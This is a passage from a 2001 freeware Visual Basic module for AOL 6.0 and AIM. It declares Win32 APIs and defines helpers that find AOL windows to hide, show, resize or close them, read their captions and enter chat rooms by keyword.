Attribute VB_Name = "Source60"
Option Explicit
'Final Released Feb 19th 2k1
'THIS IS VERSION TWO ; CLEANER CODING, MORE FUNCTIONS
'This is source60v2 Module for AOL6.0 and AIM 4.3 +
'**new**Also for AIM 4.3 + or higher**new**
'This was completly programed by source any subs my
'friends helped wit they got credit for!
'this is the **[[second]]** version release
'This is freeware, Enjoy!!!
'www.vbfx.net
'www.8op.com/vbfx
'www.terrorfx.com/~source
'visit my website while your here
'thanx prozac,gravity, dos, monk-e-god(fader subs)
'340 subs/functions of pure ao6 & aim coding ENJOY!!
'########################################################
'#if you use this module for your prog, can ya hook me  #
'#up with some credit???                                #
'#if ya use my subs/functions in your module/prog can ya#
'#put under it                                          #
'#from source60                                         #
'#thnx...                                               #
'########################################################

'[[[note]]]
'there are alot of subs/functions that i define
'and tell what does what...there are some that dont
'if u scroll down you will see that the first i dont know
'about 50 or so i guess give descriptions to what does
'what...if it doesnt and you dont understand look at
'ones that do
'[[[END]]]
'-------------------------------------------------------
'[[[note]]]
'*buggy*
'about RunToolbar
'to understand how to use it you must understand what
'numbers and letters are in what sections
'take a look at your aol screen... see where it says
'mail (then a down arrow) that is 0
'people(then down arrow) that is 1
'aolservices(down arrow) that is 2
'settings (down arrow) that is 3
'favorites(down arrow) that is 4
'for the letters its pretty simple...find what you want
'to go to, look at what letter is underlined
'thats the letter you will use in code.
'ex: People and Down to Find A Chat
'Call RunToolbar("1", "F")
'the '1' is section People, the F is the letter its
'going to , pretty simple, enjoy that
'[[[END]]]
'-------------------------------------------------------
'[[[note]]]
'Conserning 'Dim' / 'Dimming of Variables'
'I didnt dim everything it takes up to much time, same
'reason i didnt give a description for everything.
'basically for all the coding here if it says sub or function
'not defined you either need to dim it by doing this:
'Dim WhatEverIsntWOrking as long
'or
'add a delcares



'Public Declare
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Public Declare Function SendMessageLong& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Public Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)

Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long

Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As String, ByVal fuWinIni As Long) As Long
Public Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long

Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Public Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long

Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal fEnable As Long) As Long
Public Declare Function ReleaseCapture Lib "user32" () As Long
Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Public Declare Function ExitWindowsEx& Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long)
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Public Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (destination As Any, source As Any, ByVal Length As Long)
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
'Public Const

Public Const LB_SETCURSEL = &H186
Public Const SW_SHOW = 5
Public Const SW_SHOWNORMAL = 1
Public Const SW_HIDE = 0
Public Const SW_MINIMIZE = 6
Public Const SW_MAXIMIZE = 3
Public Const BM_SETCHECK = &HF1
Public Const BM_GETCHECK = &HF0
Public Const WM_CLOSE = &H10
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_SETTEXT = &HC
Public Const WM_GETTEXT = &HD
Public Const WM_LBUTTONDBLCLK = &H203
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONUP = &H202
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_MENU = &H12
Public Const VK_RETURN = &HD
Public Const VK_RIGHT = &H27
Public Const VK_SHIFT = &H10
Public Const VK_SPACE = &H20
Public Const VK_UP = &H26
Public Const HWND_NOTOPMOST = -2
Public Const HWND_TOPMOST = -1
Public Const PROCESS_READ = &H10
Public Const RIGHTS_REQUIRED = &HF0000
Public Const ENTER_KEY = 13
Global Const GW_CHILD = 5

Public Type POINTAPI
      x As Long
      Y As Long
End Type

Public Const Op_Flags = PROCESS_READ Or RIGHTS_REQUIRED

Public Const SW_RESTORE = 9

Public Const LB_ADDSTRING& = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRINGEXACT& = &H1A2
Public Const LB_GETCOUNT& = &H18B
Public Const LB_GETCURSEL& = &H188
Public Const LB_GETITEMDATA = &H199
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN& = &H18A
Public Const LB_INSERTSTRING = &H181
Public Const LB_RESETCONTENT& = &H184

Public Const LB_SETSEL = &H185

Public Const CB_ADDSTRING& = &H143
Public Const CB_DELETESTRING& = &H144
Public Const CB_FINDSTRINGEXACT& = &H158
Public Const CB_GETCOUNT& = &H146
Public Const CB_GETITEMDATA = &H150
Public Const CB_GETLBTEXT& = &H148
Public Const CB_RESETCONTENT& = &H14B
Public Const CB_SETCURSEL& = &H14E

Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10

Public Const Sys_Add = &H0
Public Const Sys_Delete = &H2
Public Const Sys_Message = &H1
Public Const Sys_Icon = &H2
Public Const Sys_Tip = &H4

Public Const SND_FLAG = SND_ASYNC Or SND_NODEFAULT
Public Const Snd_Flag2 = SND_ASYNC Or SND_LOOP




Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1

Public Const WM_CHAR = &H102

Public Const WM_CLEAR = &H303
Public Const WM_MOUSEMOVE = &H200
Public Const WM_COMMAND = &H111

Public Const WM_MOVE = &HF012

Public Const WM_SYSCOMMAND = &H112

Public Const MF_BYPOSITION = &H400&

Public Const EM_GETLINECOUNT& = &HBA

Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE



Public Enum MAILTYPE
        mailFLASH
        mailNEW
        mailOLD
        mailSENT
End Enum

Public systray As NOTIFYICONDATA

Public Type NOTIFYICONDATA
        cbSize As Long
        hwnd As Long
        uId As Long
        uFlags As Long
        ucallbackMessage As Long
        hIcon As Long
        szTip As String * 64
End Type

Type RECT
        Left As Long
        Top As Long
        Right As Long
        Bottom As Long
    End Type

Public Enum OnScreen
    scon
    scoff
End Enum
' (down) Monk-e-god (down)
Public Const FADE_RED = &HFF&
Public Const FADE_GREEN = &HFF00&
Public Const FADE_BLUE = &HFF0000
Public Const FADE_YELLOW = &HFFFF&
Public Const FADE_WHITE = &HFFFFFF
Public Const FADE_BLACK = &H0&
Public Const FADE_PURPLE = &HFF00FF
Public Const FADE_GREY = &HC0C0C0
Public Const FADE_PINK = &HFF80FF
Public Const FADE_TURQUOISE = &HC0C000

Type COLORRGB
  red As Long
  Green As Long
  blue As Long
End Type
' ^ (up) Monk-e-god (up) ^
'by source(for fader subs)(DOWN)
Dim R2
Dim G2
Dim B2
Dim R1
Dim G1
Dim B1
Dim StartY
Dim dafont As String
Dim fontstart As Integer
Dim BV
Dim GV
Dim RV
Dim BlueString As String
Dim GreenString As String
Dim RedString As String
Dim ColorString As String
Dim ColorStart
Dim textoffy
Dim t As String
Dim TagEnd
Dim TagStart
Dim c As String
Dim x
Dim StartX
Dim textoffx
Dim osm
Dim FadedText As String
Dim CurCharVal
Dim bluenum10 As Integer
Dim greennum10 As Integer
Dim rednum10 As Integer
Dim bluenum9 As Integer
Dim greennum9 As Integer
Dim rednum9 As Integer
Dim bluenum8 As Integer
Dim greennum8 As Integer
Dim rednum8 As Integer
Dim bluenum7 As Integer
Dim greennum7 As Integer
Dim rednum7 As Integer
Dim bluenum6 As Integer
Dim greennum6 As Integer
Dim rednum6 As Integer
Dim bluenum5 As Integer
Dim greennum5 As Integer
Dim rednum5 As Integer
Dim bluenum4 As Integer
Dim greennum4 As Integer
Dim rednum4 As Integer
Dim bluenum3 As Integer
Dim greennum3 As Integer
Dim rednum3 As Integer
Dim bluenum2 As Integer
Dim greennum2 As Integer
Dim rednum2 As Integer
Dim bluenum1 As Integer
Dim greennum1 As Integer
Dim rednum1 As Integer
Dim dacolor10 As String
Dim dacolor9 As String
Dim dacolor8 As String
Dim dacolor7 As String
Dim dacolor6 As String
Dim dacolor5 As String
Dim dacolor4 As String
Dim dacolor3 As String
Dim dacolor2 As String
Dim dacolor1 As String
Dim Faded4 As String
Dim Faded3 As String
Dim Faded2 As String
Dim Faded1 As String
Dim Faded5 As String
Dim WaveHTML
Dim colorx2
Dim ColorX
Dim LastChr As String
Dim TextDone As String
Dim i
Dim part5 As String
Dim part4 As String
Dim part3 As String
Dim part2 As String
Dim part1 As String
Dim part6 As String
Dim part7 As String
Dim part8 As String
Dim part9 As String
Dim frthlen As Integer
Dim thrdlen As Integer
Dim seclen As Integer
Dim fstlen As Integer
Dim TextLen As Integer
Dim WaveState
Dim fithlen As Integer
Dim sixlen As Integer
Dim eightlen As Integer
Dim ninelen As Integer
Dim sevlen As Integer
Dim faded6 As String
Dim faded7 As String
Dim faded8 As String
Dim faded9 As String
Dim newblue As Integer
Dim newgreen As Integer
Dim newred As Integer
Dim bluex As Integer
Dim greenx As Integer
Dim redx As Integer
Dim dacolor As String
Dim FadedTxtX As String
Dim qwe As Integer
Dim r As Integer
Dim E As Integer
Dim dastart As Integer
Dim f As Integer
Dim W As Integer
Dim q As Integer
Dim blah3 As String
Dim blah2
Dim bluepart As Integer
Dim greenpart As Integer
Dim redpart As Integer
Dim blah As String
Dim thepos As Integer
Dim InStr1
Dim STRwo13s
Dim b As Integer
Dim a As String
Dim colorhex
Dim Italiced
Dim Striked
Dim Undered
Dim Bolded
Dim HTMLString
Dim posi As Integer
Dim rgbhex As String
'i had to do all that crap cause monk-e-god was too lazy to dim his variables
'ggggrrrr....(that shit like took me longer then the whole module







'Examples on how to use these functions
'ex1:
'Call Hideaol
'ex2:
'Call ShowAol
'Basically CALL then the Function/Sub Name
'any questions...
'AIM:sourceofvbfx
'AOL:itzdasource

Public Function HideAOL()
'dims
Dim AOLFrame As Long
'finds aol frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
'coding to hide window/frame
Call ShowWindow(AOLFrame&, SW_HIDE)
End Function

Public Function ShowAOL()
'dims
Dim AOLFrame As Long
'finds aol frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
'makes aol frame normal/restore
Call ShowWindow(AOLFrame&, SW_SHOWNORMAL)
End Function

Public Function MinimizeAol()
'dims
Dim AOLFrame As Long
'finds aol frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
'coding to minimize window
Call ShowWindow(AOLFrame&, SW_MINIMIZE)
End Function

Public Function MaximizeAol()
'dims
Dim AOLFrame As Long
'finds aol frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
'coding to maximize window
Call ShowWindow(AOLFrame&, SW_MAXIMIZE)
End Function

Public Function CloseAolWindow()
'dims
Dim AOLFrame As Long
'finds frames
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
'coding to close the aol window/frame down
Call SendMessage(AOLFrame&, WM_CLOSE, 0&, 0&)
End Function

Public Function GetAolWindowCaption()
Dim AOLFrame As Long
Dim CaptionLength As Long
Dim aolframecaption As String
'finds window first
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
'gets lengths for caption/text
CaptionLength& = GetWindowTextLength(AOLFrame&)
'defines
aolframecaption$ = String$(CaptionLength&, 0)
'applys coding to change caption
Call GetWindowText(AOLFrame&, aolframecaption$, (CaptionLength& + 1&))
End Function

Public Function SetFocusOnAol()
'dims
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
'uses API to 'set focus'
Call SetFocusAPI(AOLFrame&)
End Function

Public Function CloseBuddyList()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
'finds window
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Welcome, Itz Da  s ourc e!")
AOLChild& = FindWindowEx(MDIClient&, AOLChild&, "AOL Child", vbNullString)
'coding to close aol buddylist
Call SendMessage(AOLChild&, WM_CLOSE, 0&, 0&)
End Function

Public Function HideBuddyList()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds aol frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
'finds window
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Buddy List")
'hides the buddylist
Call ShowWindow(AOLChild&, SW_HIDE)
End Function

Public Function ShowBuddyList()
'this will only work if your buddylist is hidden
'wont work if you hit x, or closed buddylist
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
'finds window
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Buddy List")
'brings BACK buddylist
Call ShowWindow(AOLChild&, SW_SHOW)
End Function

Public Function MaximizeBuddyList()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
'finds window
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Buddy List")
'maximizes buddylist
Call ShowWindow(AOLChild&, SW_MAXIMIZE)
End Function

Public Function MinimizeBuddyList()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
'MDIClient window
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Buddy List")
'minimizes buddylist
Call ShowWindow(AOLChild&, SW_MINIMIZE)
End Function

Public Function GetBuddyListCaption()

'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
Dim CaptionLength As Long
Dim AOLChildCaption As String
'finds buddylist frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Buddy List")
'sets/resets caption
CaptionLength& = GetWindowTextLength(AOLChild&)
'defines strings
AOLChildCaption$ = String$(CaptionLength&, 0)
'applies changes
Call GetWindowText(AOLChild&, AOLChildCaption$, (CaptionLength& + 1&))
End Function

Public Function CloseWriteMail()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds aol write mail frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
'closes write mail frame
Call SendMessage(AOLChild&, WM_CLOSE, 0&, 0&)
End Function

Public Function HideWriteMail()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
'hides
Call ShowWindow(AOLChild&, SW_HIDE)
End Function

Public Function MaximizeWriteMail()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
'maximizes
Call ShowWindow(AOLChild&, SW_MAXIMIZE)
End Function

Public Function MinimizeWriteMail()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
'minimizes
Call ShowWindow(AOLChild&, SW_MINIMIZE)
End Function

Public Function ShowWriteMail()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
'brings BACK the write mail window/frame
Call ShowWindow(AOLChild&, SW_SHOW)
End Function

Public Function CloseIM()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'fins frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Send Instant Message")
'Closes Instant Message
Call SendMessage(AOLChild&, WM_CLOSE, 0&, 0&)
End Function

Public Function MaximizeIM()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'fins aol frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Send Instant Message")
'shows window
Call ShowWindow(AOLChild&, SW_MAXIMIZE)
End Function

Public Function MinimizeIM()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Send Instant Message")
'applies coding to minimize
Call ShowWindow(AOLChild&, SW_MINIMIZE)
End Function

Public Function ShowIM()
'this will only work if the buddylist is already showing
'which is dumb..or if its hidden using coding in the
'module: source60 :)
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Send Instant Message")
'shows
Call ShowWindow(AOLChild&, SW_SHOW)
End Function

Public Function HideIM()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frames
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Send Instant Message")
'hides instant message
Call ShowWindow(AOLChild&, SW_HIDE)
End Function

Public Function CloseChatRoom()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)
'closes chat room
Call SendMessage(AOLChild&, WM_CLOSE, 0&, 0&)
End Function

Public Function MaximizeChatRoom()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)
'maximizes
Call ShowWindow(AOLChild&, SW_MAXIMIZE)
End Function

Public Function MinimizeChatRoom()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)
'minimizes chat room
Call ShowWindow(AOLChild&, SW_MINIMIZE)
End Function

Public Function HideChatRoom()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)
'hides chat room
Call ShowWindow(AOLChild&, SW_HIDE)
End Function

Public Function ShowChatRoom()
'dims
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)
'shows chat room
Call ShowWindow(AOLChild&, SW_SHOW)
End Function

Public Function GetChatRoomCaption()
Dim AOLFrame25 As Long
Dim MDIClient As Long
Dim AOLChild As Long

Dim lngLength As Long
Dim strBuffer As String
AOLFrame25& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame25&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)

lngLength& = GetWindowTextLength(AOLChild&)
strBuffer$ = String(lngLength&, 0&)
Call GetWindowText(AOLChild&, strBuffer$, lngLength& + 1&)
End Function

Public Function CloseWelcomeScreen()

Dim AOLFrame As Long, MDIClient As Long, AOLChild As Long
AOLFrame = FindWindow("aol frame25", vbNullString)
MDIClient = FindWindowEx(AOLFrame, 0&, "mdiclient", vbNullString)
AOLChild = FindWindowEx(MDIClient, 0&, "aol child", vbNullString)
Call EnableWindow(AOLChild, 0)
End Function


Public Function EnterMemberRoom(Room As String)
'prozac
'Enter a member chatroom, this is good for a roombust,
'example:
'Call EnterMemberRoom(Text1)
   Call Keyword("aol://2719:61-2-" + Room$)
End Function
Public Function EnterPrivateRoom(Room As String)
'prozac
'Enter a private chatroom, this is good for a roombust,
'example:
'Call EnterPrivateRoom(Text1)
Call Keyword("aol://2719:2-2-" + Room$)
End Function

Public Function Pause(Time As Long)
    'pause for a certain amount of time
    'Call pause(1)
    Dim Current As Long
    Current = Timer
    Do Until Timer - Current >= Time
        DoEvents
    Loop
End Function

Public Function FormOnTop(Form As Form)
'keeps for, on top of other windows
'EX: Call FormOnTop(form1)
Call SetWindowPos(Form.hwnd, HWND_TOPMOST, 0&, 0&, 0&, 0&, FLAGS)
End Function
Public Function FormNotOnTop(Form As Form)
'keeps form off top of other windows
'EX: Call FormNotOnTop(form1)
Call SetWindowPos(Form.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, FLAGS)
End Function

Public Function FileExists(TheFileName As String) As Boolean
'Sees if the string(file) you specified exists
If Len(TheFileName$) = 0 Then
FileExists = False
Exit Function
End If
If Len(dir$(TheFileName$)) Then
FileExists = True
Else
FileExists = False
End If
End Function

Sub FolderCreate(NewDir)
'Makes a new folder
MkDir NewDir
End Sub
Sub FolderDelete(NewDir)
'Deltes a folder
RmDir (NewDir)
End Sub
Public Function FindChatRoom() As Long
'prozac
'Finds the aol chatroom
'Example:
'If Findchatroom <> 0& then
'msgbox GetWindowCaption(Findchatroom) + "window found!"
'else
'msgbox "chatroom not found!"
'end if
Dim counter As Long
Dim AOLStatic5 As Long
Dim AOLIcon3 As Long
Dim AOLStatic4 As Long
Dim aollistbox As Long
Dim AOLStatic3 As Long
Dim AOLImage As Long
Dim AOLIcon2 As Long
Dim RICHCNTL2 As Long
Dim AOLStatic2 As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLCombobox As Long
Dim richcntl As Long
Dim AOLStatic As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)
AOLStatic& = FindWindowEx(AOLChild&, 0&, "_AOL_Static", vbNullString)
richcntl& = FindWindowEx(AOLChild&, 0&, "RICHCNTL", vbNullString)
AOLCombobox& = FindWindowEx(AOLChild&, 0&, "_AOL_Combobox", vbNullString)
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 3&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
AOLStatic2& = FindWindowEx(AOLChild&, AOLStatic&, "_AOL_Static", vbNullString)
RICHCNTL2& = FindWindowEx(AOLChild&, richcntl&, "RICHCNTL", vbNullString)
AOLIcon2& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
For i& = 1& To 2&
    AOLIcon2& = FindWindowEx(AOLChild&, AOLIcon2&, "_AOL_Icon", vbNullString)
Next i&
AOLImage& = FindWindowEx(AOLChild&, 0&, "_AOL_Image", vbNullString)
AOLStatic3& = FindWindowEx(AOLChild&, AOLStatic2&, "_AOL_Static", vbNullString)
AOLStatic3& = FindWindowEx(AOLChild&, AOLStatic3&, "_AOL_Static", vbNullString)
aollistbox& = FindWindowEx(AOLChild&, 0&, "_AOL_Listbox", vbNullString)
AOLStatic4& = FindWindowEx(AOLChild&, AOLStatic3&, "_AOL_Static", vbNullString)
AOLIcon3& = FindWindowEx(AOLChild&, AOLIcon2&, "_AOL_Icon", vbNullString)
For i& = 1& To 7&
    AOLIcon3& = FindWindowEx(AOLChild&, AOLIcon3&, "_AOL_Icon", vbNullString)
Next i&
AOLStatic5& = FindWindowEx(AOLChild&, AOLStatic4&, "_AOL_Static", vbNullString)
Do While (counter& <> 100&) And (AOLStatic& = 0& Or richcntl& = 0& Or AOLCombobox& = 0& Or AOLIcon& = 0& Or AOLStatic2& = 0& Or RICHCNTL2& = 0& Or AOLIcon2& = 0& Or AOLImage& = 0& Or AOLStatic3& = 0& Or aollistbox& = 0& Or AOLStatic4& = 0& Or AOLIcon3& = 0& Or AOLStatic5& = 0&): DoEvents
    AOLChild& = FindWindowEx(MDIClient&, AOLChild&, "AOL Child", vbNullString)
    AOLStatic& = FindWindowEx(AOLChild&, 0&, "_AOL_Static", vbNullString)
    richcntl& = FindWindowEx(AOLChild&, 0&, "RICHCNTL", vbNullString)
    AOLCombobox& = FindWindowEx(AOLChild&, 0&, "_AOL_Combobox", vbNullString)
    AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
    For i& = 1& To 3&
        AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
    Next i&
    AOLStatic2& = FindWindowEx(AOLChild&, AOLStatic&, "_AOL_Static", vbNullString)
    RICHCNTL2& = FindWindowEx(AOLChild&, richcntl&, "RICHCNTL", vbNullString)
